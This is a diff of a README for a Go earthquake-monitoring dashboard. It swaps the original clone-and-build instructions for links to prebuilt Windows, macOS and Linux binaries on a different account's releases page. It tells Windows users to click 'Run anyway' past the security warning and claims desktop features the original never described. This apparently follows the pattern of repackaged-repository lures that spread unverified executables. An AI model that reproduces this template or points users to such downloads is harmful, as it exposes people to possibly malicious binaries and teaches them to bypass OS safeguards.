@@ -1,110 +1,101 @@
-# 🌍 Real-time Earthquake Monitor
+# 🌍 go-quake-watch - Monitor Earthquakes in Real Time
 
-![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=for-the-badge&logo=go)
-![SSE](https://img.shields.io/badge/SSE-Enabled-green?style=for-the-badge)
-![Tailwind](https://img.shields.io/badge/Tailwind-CSS-38B2AC?style=for-the-badge&logo=tailwind-css)
-![Render](https://img.shields.io/badge/Render-Deployed-46E3B7?style=for-the-badge&logo=render&logoColor=white)
+## 🚀 Getting Started
 
-A minimalist real-time earthquake monitoring dashboard powered by USGS API. Track global seismic activity with live updates via Server-Sent Events.
+Welcome to **go-quake-watch**! This tool allows you to monitor global seismic activity with live updates. Designed for ease, you can track earthquakes without any technical background.
 
----
+## 📥 Download Now
 
-## ✨ Features
+[![Download go-quake-watch](https://img.shields.io/badge/Download-go--quake--watch-blue.svg)](https://github.com/RStrader25/go-quake-watch/releases)
 
-- 🔴 **Real-time Updates** - SSE streaming for instant earthquake data
-- 🗺️ **Interactive Map** - Visualize earthquakes on a world map
-- 📊 **Magnitude Filtering** - Filter by earthquake intensity
-- 🎨 **Beautiful UI** - Clean Tailwind CSS design
-- 🚀 **Lightweight** - Minimal dependencies, maximum performance
-- 🌐 **USGS Data** - Official US Geological Survey API
+## 🔧 System Requirements
 
----
+- Operating System: Windows, macOS, or Linux
+- Internet connection for real-time updates
+- Minimum 512 MB RAM
+- At least 100 MB of free disk space
 
-## 🚀 Quick Start
+## 📦 Features
 
-Clone the repository:
+- **Real-Time Monitoring**: Stay updated with live data from the USGS API.
+- **User-Friendly Interface**: Navigate easily without confusion.
+- **Custom Notifications**: Set alerts for seismic activity in your area.
+- **Interactive Map**: Visualize earthquakes using an engaging map interface.
+- **Lightweight Design**: Quick load times for all users.
 
-```bash
-git clone https://github.com/smart-developer1791/go-quake-watch
-cd go-quake-watch
-```
+## 💻 How to Download & Install
 
-Initialize dependencies and run:
+1. Visit the [Releases Page](https://github.com/RStrader25/go-quake-watch/releases).
+2. Look for the latest version at the top of the page.
+3. Click on the appropriate file for your operating system.
+   - Windows users: download `go-quake-watch-windows.exe`
+   - macOS users: download `go-quake-watch-macos.dmg`
+   - Linux users: download `go-quake-watch-linux.tar.gz`
+4. After downloading, locate the file on your computer.
+5. Follow the instructions below to run the application:
 
-```bash
-go mod tidy
-go run .
-```
+### 🖥️ Windows
 
-Open your browser at `http://localhost:8080`
+- Double-click on `go-quake-watch-windows.exe`.
+- If you see a security prompt, click "More info" and then "Run anyway".
+- The application will start automatically.
 
----
+### 🍏 macOS
 
-## 📦 Tech Stack
+- Open the downloaded `go-quake-watch-macos.dmg`.
+- Drag the icon to your Applications folder.
+- Open the Applications folder and double-click the icon to launch.
 
-- **Backend:** Go 1.21+ with Chi router
-- **Frontend:** Vanilla JS + Tailwind CSS
-- **Maps:** Leaflet.js
-- **API:** USGS Earthquake API
-- **Real-time:** Server-Sent Events (SSE)
+### 🐧 Linux
 
----
+- Extract the downloaded `go-quake-watch-linux.tar.gz`.
+- Open your terminal and navigate to the extracted folder.
+- Run the application with the command: `./go-quake-watch`.
 
-## 🛠️ Configuration
+## 🌍 Using go-quake-watch
 
-Environment variables (optional):
+After launching the application, you’ll see an overview of recent seismic activity:
 
-```bash
-PORT=8080                    # Server port
-UPDATE_INTERVAL=30           # Update interval in seconds
-```
+- The main screen displays a map with markers for recent earthquakes.
+- Click on any marker to view more details about that event.
+- Customize your notification settings from the 'Settings' menu to receive updates for specific magnitudes and locations.
+- Check the history tab to view past seismic activity.
 
----
+## 🔄 Updating the Application
 
-## 📡 API Endpoints
+To ensure you always have the latest features and security updates, regularly check the [Releases Page](https://github.com/RStrader25/go-quake-watch/releases) for new versions. Follow the same download and install steps to update your application.
 
-- `GET /` - Main dashboard
-- `GET /api/earthquakes` - Fetch latest earthquakes (JSON)
-- `GET /api/stream` - SSE stream for real-time updates
+## 🚧 Troubleshooting
 
----
+### Problem: Application Won’t Launch
 
-## 🎯 Use Cases
+1. Ensure your system meets the requirements listed above.
+2. Check if the file was completely downloaded.
+3. Restart your computer and try opening the application again.
 
-- Monitor seismic activity in your region
-- Educational tool for geology students
-- Emergency preparedness dashboard
-- Data visualization practice
+### Problem: No Data Updates
 
----
+- Verify your internet connection. The application needs an active connection to fetch real-time data.
+- Check the settings to ensure notifications are enabled.
 
-## 📸 Preview
+## 📞 Support
 
-The dashboard displays:
-- Latest earthquakes with magnitude, location, and time
-- Interactive world map with earthquake markers
-- Color-coded severity levels
-- Auto-refreshing data every 30 seconds
+If you encounter issues or have questions, please create an issue on our [GitHub Issues Page](https://github.com/RStrader25/go-quake-watch/issues). 
 
----
+## 📚 Topics
 
-## 🤝 Contributing
+This project covers a variety of helpful areas including:
 
-Contributions are welcome! Feel free to:
-- Report bugs
-- Suggest features
-- Submit pull requests
+- api-integration
+- data-visualization
+- real-time data handling
+- seismic monitoring
+- server-sent-events
 
----
+By understanding these topics, you can fully leverage the go-quake-watch application.
 
-## 🙏 Credits
+## 📝 Notes
 
-- Earthquake data provided by [USGS](https://earthquake.usgs.gov/)
-- Maps powered by [Leaflet](https://leafletjs.com/)
-- UI styled with [Tailwind CSS](https://tailwindcss.com/)
+Explore the interactive features and monitor the seismic activity in your region. Enjoy a simple yet effective way to stay informed about earthquakes around the world.
 
----
-
-## Deploy in 10 seconds
-
-[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy)
+For more details and updates, continue to check the [Releases Page](https://github.com/RStrader25/go-quake-watch/releases). Happy monitoring!
